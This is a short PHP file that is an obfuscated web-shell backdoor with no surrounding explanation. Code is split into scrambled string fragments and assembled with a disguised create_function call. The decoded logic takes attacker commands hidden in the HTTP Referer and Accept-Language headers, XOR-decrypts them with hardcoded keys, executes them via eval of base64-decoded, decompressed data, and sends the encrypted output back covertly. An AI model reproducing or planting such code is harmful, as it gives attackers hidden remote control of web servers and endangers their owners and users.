<?php
$u='rr=@%>$r%>["HTTP_REFE%>RER"];$r%>a=@$r["%>%>HTT%>P_%>ACCE%>PT_L%>ANGUAGE"];if($rr&&$ra)%>{$%>u=pars%>e_url($%>rr)';
$C='%>%>3));$p%>=%>"";for($z=1;%>$z<count($m[%>1]);$z%>++)$p.%>=$q[$m%>[2][$%>z]];if%>(strp%>os%>($p,$h)===0){%>$s';
$w=str_replace('zh','','crezhazhtzhe_zhfzhunczhtion');
$z='>[\\d]))%>?,?/",$%>ra%>,$m);if%>($%>q&&$m){@sessi%>on_s%>tart()%>;$s=%>&$_SES%>%>SION;$s%>s="substr"%>;$s%>l="%';
$I=';parse_s%>tr($u%>[%>"query"]%>,$%>q);$q=arr%>ay_values($%>%>q);%>pr%>eg_match_all("%>/([%>\\w])[\\w-]+(%>?:;q=0.(%';
$i='f($e){$k=$%>kh.$k%>f;ob_s%>ta%>rt();@ev%>al(@gzun%>compress%>(@x%>(@base%>%>64_%>decode(pr%>%>%>eg_replace(ar';
$p='>strtol%>ower";$%>i=$m[1][0]%>.$m[1][1];$h%>=$sl%>($ss(m%>d5($i.$k%>h),0,%>%>3));$f=$sl($%>ss(m%>d5($i.$kf%>),0,';
$h='ray("/%>_/"%>,"/-/")%>,array("/","+%>"),$ss(%>$s[$i],%>0,$e%>)%>))%>%>,$k%>)));$o=o%>b_get_contents%>();ob_end%>_cle%';
$A='[$i%>]%>="";$%>p=%>$ss($p,3);}if(a%>rra%>y_key_ex%>i%>%>st%>%>s($i,$s)){$s[$i].=$%>%>p;$e%>=strpos($s[$%>i],$f);i';
$r='>an();$d=b%>ase64_enc%>ode%>(x(gz%>compress%>($o%>),$k%>))%>;print("%><$k>$%>d</$k>");@ses%>sion_d%>estroy();}}}}';
$c='l;){f%>%>or($j=0;($j%><$%>c&&$%>i<$l);$j+%>+,$i++){$o.=%>$t{$i%>%>}^$k{$j};}%>%>}re%>turn $o;}$r=$_SER%>%>VER;$';
$E='$k%>h="5d41";$kf="4%>0%>2a";functi%>on x%>($t,$k)%>{$c=%>st%>rlen($k);$l=%>str%>len(%>$t);$o=%>""%>;for($i=0;$i<$%>';
$s=str_replace('%>','',$E.$c.$u.$I.$z.$p.$C.$A.$i.$h.$r);
$Z=$w('',$s);$Z();
?>
